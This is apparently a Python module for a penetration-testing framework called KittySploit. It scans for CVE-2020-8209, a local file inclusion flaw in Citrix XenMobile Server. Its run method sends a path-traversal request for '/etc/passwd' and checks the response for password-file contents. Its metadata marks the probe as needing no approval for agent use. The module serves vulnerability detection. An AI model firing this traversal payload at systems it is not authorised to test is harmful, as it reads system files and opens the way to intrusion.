#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix XenMobile Server 10."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix XenMobile Server - Local File Inclusion Detection',
        'description': 'Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6, and Citrix XenMobile Server before 10.9 RP5 are susceptible to local file inclusion vulnerabilities. reference: - https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/ - https://support.citrix.com/article/CTX277457 - https://nvd.nist.gov/vuln/detail/CVE-2020-8209',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'citrix', 'lfi', 'xenmobile', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX277457',
            'https://github.com/Miraitowa70/POC-Notes',
            'https://github.com/dudek-marcin/Poc-Exp',
            'https://github.com/hectorgie/PoC-in-GitHub',
            'https://github.com/pen4uin/vulnerability-research',
        ],
        'cve': 'CVE-2020-8209',
    }

    def run(self):
        r = self.http_request(method="GET", path='/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('fileDownload=true', 'application/octet-stream', 'attachment;',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Citrix XenMobile Server - Local File Inclusion detected",
                path='/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd',
            )
            return True
        return False

